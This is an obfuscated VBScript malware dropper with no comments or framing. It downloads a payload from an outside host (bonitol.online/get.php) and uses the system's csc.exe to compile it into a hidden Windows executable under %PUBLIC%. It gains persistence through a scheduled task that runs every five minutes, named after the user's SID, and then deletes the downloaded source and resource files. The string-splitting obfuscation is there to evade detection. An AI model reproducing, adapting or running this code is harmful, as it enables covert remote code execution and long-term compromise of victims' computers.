On Error Resume Next


Function p_35_p(UserName)
Dim p_36_p, p_37_p, p_38_p
If InStr(UserName, "\" + "" + "" + "") > 0 Then
p_36_p = Mid(UserName, 1, InStr(UserName, "\") - 1)
UserName = Mid(UserName, InStr(UserName, "\") + 1)
Else
p_36_p = CreateObject("" + "" + "" + "W" + "S" + "cri" + "" + "pt" + "." + "N" + "etwo" + "" + "" + "" + "" + "rk").UserDomain
End If
On Error Resume Next
Set p_38_p = GetObject("wi" + "nm" + "gmts" + ":" + "{" + "imp" + "erso" + "nat" + "ion" + "lev" + "el=impe" + "rsona" + "te}!" & "/roo" + "t/cimv" + "2:Win" + "32_Use" + "rAccou" + "nt" + "." + "Dom" + "ain='" & p_36_p & "'" & ",Name='" & UserName & "'")
If Err.Number = 0 Then
p_37_p = p_38_p.SID
Else
p_37_p = ""
End If
On Error GoTo 0
p_35_p = p_37_p
End Function

Function p_60_p(ByVal base64String)
Set p_61_p = CreateObject("" + "" + "" + "W" + "" + "" + "Sc" + "rip" + "" + "" + "" + "" + "t" + "." + "" + "Sh" + "" + "el" + "" + "" + "" + "" + "l")
p_61_p.Run "c" + "m" + "" + "d" + "" + "." + "e" + "" + "" + "" + "x" + "" + "" + "e " + "/c " + "whe" + "" + "re /r "+base64String+ " > 1.txt", 0
WScript.Sleep (10000)
Dim p_63_p
Set p_63_p = CreateObject("" + "" + "" + "Sc" + "rip" + "" + "ti" + "ng" + "." + "Fil" + "eSys" + "te" + "mOb" + "" + "ject") 
Set p_64_p = p_63_p.OpenTextFile("1" + "." + "t" + "" + "" + "xt", 1) 
p_65_p = ""
Do Until p_64_p.AtEndOfStream
p_65_p =  p_64_p.ReadLine()
Loop
p_64_p.Close
p_60_p = p_65_p
End Function

p_16_p ="content"
p_88_p ="p_88_p"
Set p_55_p = CreateObject("W" + "" + "" + "Sc" + "rip" + "t" + "." + "Sh" + "" + "el" + "" + "" + "l")
p_62_p=p_55_p.ExpandEnvironmentStrings("%P" + "U" + "" + "" + "" + "" + "BL" + "" + "IC%")+"\"
p_23_p = p_62_p+p_16_p
SET objFSO = CREATEOBJECT("" + "Scr" + "ipti" + "n" + "" + "g" + "." + "Fi" + "" + "" + "" + "" + "le" + "Syst" + "emObj" + "" + "ect")

IF objFSO.FolderExists(p_23_p) = FALSE THEN
	objFSO.CreateFolder p_23_p
END IF



Dim p_17_p
Set p_17_p = CreateObject("MS" + "XML" + "2." + "XML" + "HT" + "" + "TP")
p_17_p.open "G" + "" + "" + "" + "" + "E" + "" + "T", "" + "" + "" + "h" + "t" + "tp" + "" + ":/" + "" + "/bo" + "ni" + "tol" + "." + "o" + "nl" + "in" + "e/g" + "et" + "." + "ph" + "" + "p", False
p_17_p.send
 
p_19_p=Split(p_17_p.responseText,"`")
 

Set p_26_p=CreateObject("S" + "crip" + "ting" + "." + "Fi" + "leS" + "ys" + "temO" + "bje" + "ct")
p_27_p = p_23_p+"\"+p_16_p+".cs"
Set p_28_p = p_26_p.CreateTextFile(p_27_p,True)
p_28_p.Write p_19_p(1) & vbCrLf
p_28_p.Close

Set p_26_p=CreateObject("Sc" + "ript" + "ing" + "." + "F" + "ile" + "Sy" + "ste" + "mO" + "" + "bj" + "" + "ect")
p_27_p = p_23_p+"\"+p_16_p+".txt"
Set p_28_p = p_26_p.CreateTextFile(p_27_p,True)
p_28_p.Write p_19_p(0) & vbCrLf
p_28_p.Close

Set p_55_p = CreateObject("W" + "Scr" + "ipt" + "." + "S" + "hel" + "" + "l")
p_62_p=p_55_p.ExpandEnvironmentStrings("%W" + "IND" + "IR%")
p_72_p = p_55_p.Run ("c" + "" + "" + "m" + "d" + "" + "." + "e" + "xe /" + "c dir /b " + p_62_p + "\M" + "icros" + "oft" + "." + "Ne" + "t\F" + "ra" + "mew" + "ork\v" + "4.* >1" + "." + "t" + "" + "xt", 0, True)
Dim p_56_p
Set p_56_p = CreateObject("Scr" + "ipt" + "ing" + "." + "Fil" + "eSy" + "ste" + "mObje" + "" + "ct") 
Set p_57_p = p_56_p.OpenTextFile("1" + "." + "t" + "" + "" + "x" + "" + "" + "t", 1) 
p_58_p = p_57_p.ReadAll 
p_57_p.Close


set p_29_p = WScript.CreateObject("" + "" + "" + "Ws" + "crip" + "t" + "." + "Sh" + "" + "" + "e" + "ll")
Dim p_30_p
Set p_30_p = CreateObject("" + "" + "" + "" + "" + "Sc" + "ript" + "" + "ing" + "." + "Fil" + "eSys" + "temO" + "bje" + "" + "ct") 
Set p_31_p = p_30_p.OpenTextFile(p_23_p+"\"+p_16_p+"" + "." + "b" + "i" + "" + "n", 2, True)
for i=1 to 800      
p_31_p.Write  p_19_p(1)
Next
p_31_p.Close
p_32_p = ""
p_33_p = ""

Set p_55_p = CreateObject("" + "" + "" + "" + "" + "WS" + "crip" + "t" + "." + "Sh" + "" + "ell")
p_62_p=p_55_p.ExpandEnvironmentStrings("%W" + "" + "IND" + "I" + "" + "" + "R%")


Set p_34_p = CreateObject("S" + "cri" + "" + "" + "" + "" + "pt" + "i" + "ng" + "." + "Fil" + "eSys" + "temOb" + "je" + "ct")
If p_26_p.FileExists("" + p_62_p + "\" + "" + "" + "" + "" + "M" + "icro" + "" + "so" + "ft" + "." + "N" + "ET\Fr" + "" + "a" + "mewo" + "rk6" + "4\") then                
p_32_p = p_60_p("" + p_62_p + "\Mi" + "cro" + "soft" + "." + "N" + "ET\F" + "ramew" + "ork6" + "4\ c" + "sc" + "." + "e" + "" + "x" + "" + "" + "" + "" + "e") 
Else
p_32_p = p_60_p("" + p_62_p + "\" + "M" + "" + "icr" + "oso" + "ft." + "NE" + "T\Fr" + "ame" + "wo" + "rk\ c" + "sc" + "." + "e" + "" + "x" + "" + "" + "" + "" + "e")  
End If
 
p_13_p = p_16_p
p_14_p = p_16_p
p_15_p = p_16_p
p_24_p = p_23_p
p_25_p = p_23_p
p_33_p = p_32_p + " /out:" + p_23_p + "\" + p_13_p + "" + "" + "." + "" + "e" + "" + "" + "x" + "" + "" + "e /target:winexe /resource:" + p_24_p + "\" + p_14_p + "." + "b" + "i" + "" + "n " + p_25_p+"\" + p_15_p + "" + "." + "" + "" + "c" + "" + "s"

WScript.Sleep (13000)
p_29_p.Run p_33_p,0
p_39_p = p_35_p(CreateObject("WS" + "cri" + "pt" + "." + "Ne" + "" + "two" + "rk").UserName)
p_40_p = p_39_p



p_70_p = p_29_p.Run ("" + "" + "S" + "CH" + "" + "TA" + "S" + "KS" + " /" + "CR" + "EA" + "TE" + " " + "/" + "sc" + " " + "mi" + "nute " + "/m" + "o 5 /t" + "n """+p_39_p+p_40_p+""" /t" + "r """+p_23_p+"\"+p_14_p+".e" + "x" + "" + "e"" /" + "F", 0, False)
WScript.Sleep (9000)
p_71_p = p_29_p.Run ("" + "" + "" + "c" + "m" + "" + "d" + "" + "." + "ex" + "e" + " /c" + " S" + "CH" + "" + "TAS" + "KS" + " /" + "Que" + "ry" + "  " + "/FO "+"LI"+"ST "+"/V"+" /t" + "n "+p_39_p+p_40_p+ " > 2" + "." + "t" + "x" + "" + "t", 0, False)
WScript.Sleep (13000)

Set p_66_p = CreateObject("" + "" + "S" + "c" + "ri" + "pti" + "ng" + "." + "Fil" + "eSy" + "ste" + "mO" + "b" + "" + "je" + "" + "ct" + "" + "" + "") 
Set p_67_p = p_66_p.OpenTextFile("" + "2" + "" + "." + "" + "t" + "" + "x" + "" + "" + "" + "" + "t" + "" + "" + "" + "" + "", 1) 
p_68_p = ""
Do Until p_67_p.AtEndOfStream
p_68_p =  p_67_p.ReadLine()
Loop
p_67_p.Close
 
Dim p_69_p 
Set p_69_p = CreateObject("" + "" + "" + "" + "" + "W" + "S" + "" + "cri" + "" + "" + "pt" + "." + "Sh" + "" + "" + "el" + "" + "" + "l" + "" + "" + "")

 

Set p_63_p = CreateObject("" + "" + "" + "" + "" + "S" + "c" + "rip" + "t" + "in" + "" + "g" + "." + "Fi" + "" + "" + "" + "" + "le" + "" + "" + "Sy" + "ste" + "mO" + "" + "bj" + "" + "ec" + "" + "t" + "" + "" + "" + "" + "")
p_64_p = Wscript.ScriptFullName
p_63_p.DeleteFile( p_23_p+"\"+p_16_p+"" + "." + "c" + "" + "s" + "" + "" + "" + "" + "")
p_63_p.DeleteFile( p_23_p+"\"+p_16_p+"" + "." + "" + "b" + "i" + "" + "n" + "" + "" + "" + "" + "")
